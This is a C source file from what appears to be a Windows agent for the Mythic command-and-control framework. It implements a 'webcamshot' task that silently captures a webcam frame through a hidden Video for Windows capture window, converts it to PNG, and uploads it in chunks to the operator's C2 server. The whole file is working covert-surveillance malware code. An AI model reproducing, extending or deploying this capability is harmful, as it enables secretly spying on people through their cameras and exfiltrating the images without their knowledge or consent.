#include "Tasks/Webcamshot.h"

#include <windows.h>
#include <vfw.h>         // Video for Windows
#include <objbase.h>     // CoInitialize
#include <objidl.h>      // IStream, CreateStreamOnHGlobal

#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#include <gdiplus.h>

#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "gdiplus.lib")

#ifdef INCLUDE_CMD_WEBCAMSHOT

#define CHUNK_SIZE  512000      // 512 KB
#define WEBCAM_WIDTH 640
#define WEBCAM_HEIGHT 480
#define FRAME_BUFFER_SIZE (WEBCAM_WIDTH * WEBCAM_HEIGHT * 3)  // Pour RGB24

// Globals pour frame raw MJPG
unsigned char* g_rawFrame = NULL;
DWORD g_rawFrameSize = 0;

// Fonctions utilitaires pour conversion YUY2 vers RGB (si besoin)
static unsigned char clip(int i) {
    if (i <= 0) return 0;
    if (i >= 255) return 255;
    return (unsigned char)i;
}

static void YUV444toRGB888(unsigned char y, unsigned char u, unsigned char v, unsigned char *dst) {
    int C = y - 16;
    int D = u - 128;
    int E = v - 128;
    *dst++ = clip((298 * C + 409 * E + 128) >> 8);
    *dst++ = clip((298 * C - 100 * D - 208 * E + 128) >> 8);
    *dst++ = clip((298 * C + 516 * D + 128) >> 8);
}

static void YUYVToRGB24(int w, int h, unsigned char *src, unsigned char *dst) {
    int i;
    unsigned char u, y1, v, y2;
    for (i = 0; i < w * h; i += 2) {
        y1 = *src++;
        u = *src++;
        y2 = *src++;
        v = *src++;
        YUV444toRGB888(y1, u, v, dst);
        dst += 3;
        YUV444toRGB888(y2, u, v, dst);
        dst += 3;
    }
}

// Structure Cam
typedef struct {
    HWND hwnd;
    long w, h;
    BITMAPINFO bmi;
    unsigned char *rgb;  // Buffer RGB24
} Cam;

// Callback pour le flux vidéo
LRESULT CALLBACK capVideoStreamCallback(HWND hwnd, LPVIDEOHDR vhdr) {
    Cam *c = (Cam *)capGetUserData(hwnd);
    if (!c || !vhdr || !vhdr->lpData) return 0;

    DWORD compression = c->bmi.bmiHeader.biCompression;
    if (compression == 0) {  // BI_RGB (RGB24)
        memcpy(c->rgb, vhdr->lpData, FRAME_BUFFER_SIZE);
    } else if (compression == mmioFOURCC('Y', 'U', 'Y', '2')) {  // YUY2
        YUYVToRGB24(c->w, c->h, (unsigned char *)vhdr->lpData, c->rgb);
    } else if (compression == mmioFOURCC('M', 'J', 'P', 'G')) {  // MJPG
        if (g_rawFrame) free(g_rawFrame);
        g_rawFrame = (unsigned char*)malloc(vhdr->dwBytesUsed);
        if (g_rawFrame) {
            memcpy(g_rawFrame, vhdr->lpData, vhdr->dwBytesUsed);
            g_rawFrameSize = vhdr->dwBytesUsed;
        }
    } else {
        // Silent pour Mythic
    }
    return 0;
}

// Fonctions Cam
static void cam_init(Cam *c, long w, long h, unsigned char *rgb) {
    c->hwnd = capCreateCaptureWindowA(0, 0, 0, 0, 0, 0, 0, 0);
    c->w = w;
    c->h = h;
    c->rgb = rgb;
}

static void cam_on(Cam *c) {
    capSetUserData(c->hwnd, c);
    capDriverConnect(c->hwnd, 0);
    capGetVideoFormat(c->hwnd, &c->bmi, sizeof(c->bmi));
    c->bmi.bmiHeader.biWidth = c->w;
    c->bmi.bmiHeader.biHeight = c->h;
    c->bmi.bmiHeader.biPlanes = 1;
    c->bmi.bmiHeader.biBitCount = 12;  // Pour MJPG
    c->bmi.bmiHeader.biCompression = mmioFOURCC('M', 'J', 'P', 'G');  // Force MJPG
    c->bmi.bmiHeader.biSizeImage = 0;
    if (!capSetVideoFormat(c->hwnd, &c->bmi, sizeof(c->bmi))) {
        capGetVideoFormat(c->hwnd, &c->bmi, sizeof(c->bmi));  // Récupère le format réel
    }
    capSetCallbackOnFrame(c->hwnd, capVideoStreamCallback);
    capPreview(c->hwnd, TRUE);  // Active preview pour démarrer le stream
}

static void cam_cap(Cam *c) {
    capGrabFrameNoStop(c->hwnd);
}

static void cam_off(Cam *c) {
    capPreview(c->hwnd, FALSE);  // Arrête preview
    capDriverDisconnect(c->hwnd);
}

static void cam_destroy(Cam *c) {
    DestroyWindow(c->hwnd);
}

/* Return 0 on success, -1 on failure */
static int GetEncoderClsidW(const WCHAR* mimeType, CLSID* pClsid) {
    UINT num = 0, size = 0;
    if (GdipGetImageEncodersSize(&num, &size) != Ok || size == 0) return -1;

    ImageCodecInfo* pInfo = (ImageCodecInfo*)malloc(size);
    if (!pInfo) return -1;

    if (GdipGetImageEncoders(num, size, pInfo) != Ok) {
        free(pInfo);
        return -1;
    }

    for (UINT i = 0; i < num; ++i) {
        if (pInfo[i].MimeType && wcscmp(pInfo[i].MimeType, mimeType) == 0) {
            *pClsid = pInfo[i].Clsid;
            free(pInfo);
            return 0;
        }
    }
    free(pInfo);
    return -1;
}

char* webcamshot_data(int* size) {
    if (size) *size = 0;
    g_rawFrameSize = 0;

    // Allouer buffer RGB (pour formats non-MJPG)
    unsigned char *rgb = (unsigned char *)malloc(FRAME_BUFFER_SIZE);
    if (!rgb) return NULL;
    memset(rgb, 0, FRAME_BUFFER_SIZE);

    Cam c = {0};
    cam_init(&c, WEBCAM_WIDTH, WEBCAM_HEIGHT, rgb);

    if (!c.hwnd) {
        free(rgb);
        return NULL;
    }

    // Init COM et DPI-aware
    if (FAILED(CoInitialize(NULL))) {
        free(rgb);
        cam_destroy(&c);
        return NULL;
    }
    SetProcessDPIAware();

    // Connexion et setup
    cam_on(&c);

    if (!capDriverConnect(c.hwnd, 0)) {
        free(rgb);
        cam_off(&c);
        cam_destroy(&c);
        CoUninitialize();
        return NULL;
    }

    // Capturer un frame
    cam_cap(&c);
    Sleep(200);  // Attendre pour callback

    DWORD compression = c.bmi.bmiHeader.biCompression;
    BOOL hasData = FALSE;

    GpImage* pImage = NULL;
    ULONG_PTR gdipToken = 0;
    GdiplusStartupInput gdipInput = {1, NULL, FALSE, FALSE};
    GdiplusStartup(&gdipToken, &gdipInput, NULL);

    IStream* stream = NULL;
    if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stream))) {
        goto cleanup;
    }

    CLSID pngClsid;
    if (GetEncoderClsidW(L"image/png", &pngClsid) != 0) {
        goto cleanup;
    }

    if (compression == mmioFOURCC('M', 'J', 'P', 'G') && g_rawFrameSize > 0) {
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, g_rawFrameSize);
        if (hGlobal) {
            void* pGlobal = GlobalLock(hGlobal);
            memcpy(pGlobal, g_rawFrame, g_rawFrameSize);
            GlobalUnlock(hGlobal);
            IStream* jpegStream = NULL;
            if (SUCCEEDED(CreateStreamOnHGlobal(hGlobal, FALSE, &jpegStream))) {
                if (GdipLoadImageFromStream(jpegStream, &pImage) == Ok && pImage) {
                    hasData = TRUE;
                }
                jpegStream->lpVtbl->Release(jpegStream);
            }
        }
    } else if (compression == 0 || compression == mmioFOURCC('Y', 'U', 'Y', '2')) {
        int captured = 0;
        for (int i = 0; i < FRAME_BUFFER_SIZE && !captured; i++) {
            if (rgb[i] != 0) captured = 1;
        }
        if (captured) {
            GpBitmap* gpBmp = NULL;
            if (GdipCreateBitmapFromScan0(WEBCAM_WIDTH, WEBCAM_HEIGHT, WEBCAM_WIDTH * 3, PixelFormat24bppRGB, rgb, &gpBmp) == Ok) {
                pImage = (GpImage*)gpBmp;
                hasData = TRUE;
            }
        }
    }

    if (!hasData || !pImage) {
        goto cleanup;
    }

    if (GdipSaveImageToStream(pImage, stream, &pngClsid, NULL) != Ok) {
        goto cleanup;
    }

    LARGE_INTEGER zero = {0};
    ULARGE_INTEGER newPos;
    stream->lpVtbl->Seek(stream, zero, STREAM_SEEK_SET, &newPos);

    STATSTG stat;
    stream->lpVtbl->Stat(stream, &stat, STATFLAG_NONAME);

    DWORD len = (DWORD)stat.cbSize.LowPart;
    char* data = (char*)malloc(len ? len : 1);
    if (!data) {
        goto cleanup;
    }

    ULONG bytesRead = 0;
    HRESULT hr = stream->lpVtbl->Read(stream, data, len, &bytesRead);

    if (SUCCEEDED(hr) && bytesRead == len) {
        if (size) *size = (int)len;
        free(g_rawFrame);
        g_rawFrame = NULL;
        free(rgb);
        GdipDisposeImage(pImage);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        cam_off(&c);
        cam_destroy(&c);
        CoUninitialize();
        return data;
    }

    free(data);

cleanup:
    if (g_rawFrame) free(g_rawFrame);
    g_rawFrame = NULL;
    free(rgb);
    if (pImage) GdipDisposeImage(pImage);
    if (stream) stream->lpVtbl->Release(stream);
    GdiplusShutdown(gdipToken);
    cam_off(&c);
    cam_destroy(&c);
    CoUninitialize();
    if (size) *size = 0;
    return NULL;
}

/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download WEBCAMSHOT_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD WebcamshotInit(_In_ PCHAR taskUuid, _Inout_ WEBCAMSHOT_DOWNLOAD* download)
{
    DWORD Status = 0;

    // Calculate total chunks (rounded up)
    download->totalChunks = (DWORD)((download->webcamshot_size + CHUNK_SIZE - 1) / CHUNK_SIZE);

    // Prepare package
    PPackage data = PackageInit(DOWNLOAD_INIT, TRUE);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, download->totalChunks);
    PackageAddString(data, download->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);
    PackageAddByte(data, 1); // is_screenshot = True (repurposed for webcamshot)

    // Send package
    PARSER Response = { 0 };
    PackageSend(data, &Response);

    BYTE status = ParserGetByte(&Response);
    if (status == FALSE)
    {
        _err("DownloadInit returned failure status : 0x%hhx", status);
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    SIZE_T lenUuid  = TASK_UUID_SIZE;
    PCHAR uuid = ParserGetString(&Response, &lenUuid);
    if (uuid == NULL) 
    {
        _err("Failed to get UUID from response.");
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
    download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination

end:
    // Cleanup
    if (data) PackageDestroy(data);
    if (&Response) ParserDestroy(&Response);

    return Status;
}

/**
 * @brief Send b64 chunks of a file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download WEBCAMSHOT_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD WebcamshotContinue(_In_ PCHAR taskUuid, _Inout_ WEBCAMSHOT_DOWNLOAD* download)
{
    DWORD Status = 0;
    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer)
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto cleanup;
    }

    download->currentChunk = 1;

    DWORD remaining = download->webcamshot_size;
    while (download->currentChunk <= download->totalChunks)
    {
        DWORD bytesRead = 0;
        if(remaining < CHUNK_SIZE)
            bytesRead = remaining;
        else
            bytesRead = CHUNK_SIZE;

        _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

        // Prepare package
        PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
        PackageAddString(cur, taskUuid, FALSE);
        PackageAddInt32(cur, download->currentChunk);
        PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(cur, download->webcamshot_data + (download->currentChunk-1)*CHUNK_SIZE, bytesRead, TRUE);
        PackageAddInt32(cur, bytesRead);

        remaining -= bytesRead;

        // Send chunk
        PARSER Response = { 0 };
        PackageSend(cur, &Response);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("Download chunk %d failed.", download->currentChunk);
            Status = ERROR_MYTHIC_DOWNLOAD;
            PackageDestroy(cur);
            ParserDestroy(&Response);
            goto cleanup;
        }

        download->currentChunk++;

        PackageDestroy(cur);
        ParserDestroy(&Response);
    }

cleanup:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Status;
}

/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Webcamshot(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    SIZE_T pathLen      = 0;
    DWORD status;
    WEBCAMSHOT_DOWNLOAD fd    = { 0 };

    // Perform webcam capture
    size_t dataSize;
    unsigned char* pixels = webcamshot_data(&dataSize);

    if (pixels == NULL)
    {
        PackageError(taskUuid, ERROR_INVALID_HANDLE);
        goto end;
    }
    
    fd.webcamshot_data = pixels;
    fd.webcamshot_size = dataSize;

    strncpy(fd.filepath, "webcamshot.png", 15);

    // Prepare to send
    status = WebcamshotInit(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    _dbg("Sending webcamshot FilePath:\"%s\" - ID:%s", fd.filepath, fd.fileUuid);

    // Transfer chunked file
    status = WebcamshotContinue(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    if (pixels != NULL)
        free(pixels);
    
}

/**
 * @brief Thread entrypoint for Webcamshot function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI WebcamshotThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Webcamshot(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Webcamshot Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}



#endif  //INCLUDE_CMD_WEBCAMSHOT